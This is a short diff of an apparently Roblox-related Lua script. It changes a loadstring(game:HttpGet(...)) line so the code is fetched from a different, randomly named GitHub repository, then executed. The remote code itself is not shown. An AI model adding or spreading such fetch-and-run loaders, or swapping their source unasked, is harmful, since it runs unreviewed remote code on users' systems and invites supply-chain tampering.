@@ -6646,6 +6646,6 @@ local env = {
     library = library
 }
 
-local loader = loadstring(game:HttpGet("https://raw.githubusercontent.com/WeshkyB/CandyFarm/refs/heads/main/test/file2.lua"))()
+local loader = loadstring(game:HttpGet("https://raw.githubusercontent.com/CrazyGaming1337/fvsregtrhttht/refs/heads/main/file2.lua"))()
 
 loader(env)
